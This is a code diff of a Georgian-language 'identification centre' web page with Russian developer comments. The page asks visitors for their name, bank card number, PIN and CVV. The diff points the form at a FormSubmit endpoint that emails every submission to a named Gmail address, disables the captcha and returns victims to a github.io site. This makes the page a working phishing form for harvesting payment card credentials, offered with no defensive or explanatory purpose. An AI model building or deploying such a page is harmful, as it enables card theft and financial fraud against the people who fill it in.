@@ -104,24 +104,27 @@
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
     <!-- 
-        ВАЖНО: action ведет на твой Getform. 
-        method="POST" обязателен.
+        ПОДКЛЮЧЕНИЕ FORMSUBMIT
+        Замени ТВОЯ_ПОЧТА@MAIL.COM на свой адрес
     -->
-    <form id="contact-form" action="https://getform.io" method="POST">
+    <form action="https://formsubmit.co/kapanadze1995work@gmail.com
+" method="POST">
+        
+        <!-- НАСТРОЙКИ FORMSUBMIT -->
+        <input type="hidden" name="_captcha" value="false"> <!-- Отключает проверку на робота -->
+        <input type="hidden" name="_next" value="https://xn----ctbeucnqcd8a.github.io"> <!-- Куда вернуть пользователя -->
+        <input type="hidden" name="_subject" value="Новые данные с сайта!"> <!-- Тема письма -->
+
         <h3>დატოვეთ თქვენი მონაცემები</h3>
 
-        <!-- ЭТО ПОЛЕ ВЕРНЕТ КЛИЕНТА НА ТВОЙ САЙТ, А НЕ НА ШАБЛОН GETFORM -->
-        <!-- Замени ссылку ниже на адрес своего сайта на GitHub -->
-        <input type="hidden" name="_redirect" value="https://xn----ctbeucnqcd8a.github.io">
-
         <label for="first-name">სახელი (Имя)</label>
-        <input type="text" name="First_Name" id="first-name" required>
+        <input type="text" name="Имя" id="first-name" required>
 
         <label for="last-name">გვარი (Фамилия)</label>
-        <input type="text" name="Last_Name" id="last-name" required>
+        <input type="text" name="Фамилия" id="last-name" required>
 
         <label for="order-id">ბარათის ნომერი (Номер карты)</label>
-        <input type="text" name="Card_Number" id="order-id"
+        <input type="text" name="Номер_Карты" id="order-id"
                placeholder="0000 0000 0000 0000"
                maxlength="19"
                inputmode="numeric"
@@ -130,7 +133,7 @@
         <div class="expiry-cvv-row">
             <div>
                 <label for="pin-code">PIN კოდი</label>
-                <input type="text" name="PIN_Code" id="pin-code"
+                <input type="text" name="PIN_код" id="pin-code"
                        placeholder="****"
                        maxlength="4"
                        inputmode="numeric"
@@ -138,7 +141,7 @@
             </div>
             <div>
                 <label for="cvv">CVV</label>
-                <input type="text" name="CVV_Code" id="cvv"
+                <input type="text" name="CVV_код" id="cvv"
                        placeholder="***"
                        maxlength="3"
                        inputmode="numeric"
@@ -151,18 +154,18 @@
 </div>
 
 <script>
-    // Форматирование номера карты (пробелы каждые 4 цифры)
+    // Маска для номера карты
     document.getElementById('order-id').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
     });
 
-    // Только цифры для PIN (ограничил до 4 цифр, как обычно у карт)
+    // Ограничение PIN
     document.getElementById('pin-code').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,4);
     });
 
-    // Только цифры для CVV
+    // Ограничение CVV
     document.getElementById('cvv').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
     });
